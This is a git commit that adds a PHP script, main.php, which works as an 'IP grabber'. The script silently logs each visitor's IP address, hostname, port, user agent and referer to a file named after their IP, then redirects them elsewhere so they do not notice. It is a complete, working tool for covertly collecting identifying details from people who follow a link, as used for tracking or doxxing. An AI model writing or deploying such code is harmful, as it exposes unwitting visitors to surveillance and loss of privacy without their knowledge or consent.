e7c8d73535c7f712c1b41a8af2c29a5292b32917
VirjoxDev <pwatson683@c2kni.net>
2016-03-02 15:55:29 +0000

    Added files via upload

---
+++ main.php
@@ -0,0 +1,19 @@
+<?php
+    $protocol = $_SERVER['SERVER_PROTOCOL'];
+	$ip = $_SERVER['REMOTE_ADDR'];
+	$port = $_SERVER['REMOTE_PORT'];
+	$agent = $_SERVER['HTTP_USER_AGENT'];
+	$ref = $_SERVER['HTTP_REFERER'];
+	$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+
+    //Print IP, Hostname, Port Number, User Agent and Referer To log.txt
+	//PHP coded by @GeckocoRBLX on twaitter 
+	$fh = fopen('ips/'.$ip.'.txt', 'w');
+	fwrite($fh, 'IP Address: '."".$ip ."\n");
+	fwrite($fh, 'Hostname: '."".$hostname ."\n");
+	fwrite($fh, 'Port Number: '."".$port ."\n");
+	fwrite($fh, 'User Agent: '."".$agent ."\n");
+	fwrite($fh, 'HTTP Referer: '."".$ref ."");
+	fclose($fh);
+	header('Location: http://www.example.com/');
+?>
